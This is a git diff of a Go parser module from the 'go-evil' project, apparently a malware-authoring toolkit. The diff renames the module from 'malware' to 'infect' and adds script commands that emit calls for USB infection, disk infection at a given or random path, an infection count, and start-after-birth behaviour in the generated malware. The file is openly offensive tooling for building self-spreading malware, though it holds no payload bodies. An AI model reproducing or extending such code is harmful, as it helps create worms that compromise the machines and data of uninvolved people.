@@ -1,16 +1,16 @@
-package malware
+package infect
 
 import (
 	"regexp"
 
-	malware "github.com/s9rA16Bf4/go-evil/domains/malware/private"
+	mal "github.com/s9rA16Bf4/go-evil/domains/malware/private"
 	"github.com/s9rA16Bf4/notify_handler/go/notify"
 )
 
 const (
-	EXTRACT_SUBDOMAIN      = "(malware|#object|#self|#this)\\.(.+)\\.(.+)\\(.*\\);" // Captures subdomain and function
-	EXTRACT_FUNCTION_VALUE = ".+\\(\"(.*)\"\\);"                                    // Grabs the value being passed to the function
-	EXTRACT_FUNCTION       = "(malware|#object|#self|#this)\\.(.+)\\(.*\\);"        // This is for the cases when we don't have a subdomain
+	EXTRACT_SUBDOMAIN      = "(infect)\\.(.+)\\.(.+)\\(.*\\);" // Captures subdomain and function
+	EXTRACT_FUNCTION_VALUE = ".+\\(\"(.*)\"\\);"               // Grabs the value being passed to the function
+	EXTRACT_FUNCTION       = "(infect)\\.(.+)\\(.*\\);"        // This is for the cases when we don't have a subdomain
 )
 
 func Parse(new_line string) {
@@ -28,30 +28,23 @@ func Parse(new_line string) {
 	if len(result) > 0 { // There is a subdomain to extract
 		subdomain := result[0][2]
 		function := result[0][3]
-
 		switch subdomain {
+		case "disk":
+			switch function {
+			case "random":
+				mal.AddContent("infect.Disk_random()")
+			default:
+				function_error(function)
+			}
 		case "set":
 			switch function {
-			case "extension":
-				malware.SetExtension(value)
-			case "name":
-				malware.SetBinaryName(value)
+			case "count":
+				mal.AddContent("infect.Set_infection_count(\"" + value + "\")")
+			case "start_after_birth":
+				mal.AddContent("infect.Set_start_after_birth()")
+
 			default:
 				function_error(function)
-			}
-		case "add":
-			switch function {
-			case "random_function":
-				malware.AddRandomFunction()
-			case "random_variable":
-				malware.AddRandomVariable()
-			default:
-				function_error(function)
-			}
-		case "disable":
-			switch function {
-			case "region":
-				malware.Disable_region(value)
 			}
 		default:
 			subdomain_error(subdomain)
@@ -62,16 +55,19 @@ func Parse(new_line string) {
 		if len(result) > 0 {
 			function := result[0][2]
 			switch function {
+			case "usb":
+				mal.AddContent("infect.USB()")
+			case "disk":
+				mal.AddContent("infect.Disk(\"" + value + "\")")
 			default:
 				function_error(function)
 			}
 		}
 	}
 }
-
 func subdomain_error(subdomain string) {
-	notify.Error("Unknown subdomain '"+subdomain+"'", "malware.Parse()")
+	notify.Error("Unknown subdomain '"+subdomain+"'", "infect.Parse()")
 }
 func function_error(function string) {
-	notify.Error("Unknown function '"+function+"'", "malware.Parse()")
+	notify.Error("Unknown function '"+function+"'", "infect.Parse()")
 }
